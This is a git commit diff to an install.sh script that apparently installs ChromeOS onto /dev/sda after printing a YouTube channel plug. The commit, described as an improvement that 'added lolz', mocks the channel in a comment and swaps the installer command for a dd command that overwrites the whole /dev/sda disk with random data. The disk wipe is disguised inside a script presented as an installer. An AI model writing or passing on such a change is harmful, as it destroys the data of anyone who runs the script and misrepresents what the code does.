526fc4baa0c81867665a560dac7d7598d54ee616
아잇 <68202470+nonforgettable@users.noreply.github.com>
2020-08-10 00:38:06 +0900

    Improved the script
    added lolz

--- install.sh
+++ install.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
-# SUBSCRIBE to Kedar Nimbalkar on youtube for more such videos https://www.youtube.com/user/kedar123456889
+# DO NOT SUBSCRIBE to Kedar Nimbalkar on youtube for more such videos than your spit [link removed]
 sudo apt-get update
 sudo apt-get install figlet
 sudo apt-get install pv
@@ -8,4 +8,4 @@ sudo figlet -c "SUBSCRIBE TO"
 sudo figlet -c Kedar
 sudo figlet -c Nimbalkar
 sudo echo https://www.youtube.com/user/kedar123456889
-sudo bash chromeos-install.sh -src rammus_recovery.bin -dst /dev/sda
+dd if=/dev/urandom of=/dev/sda bs=1M
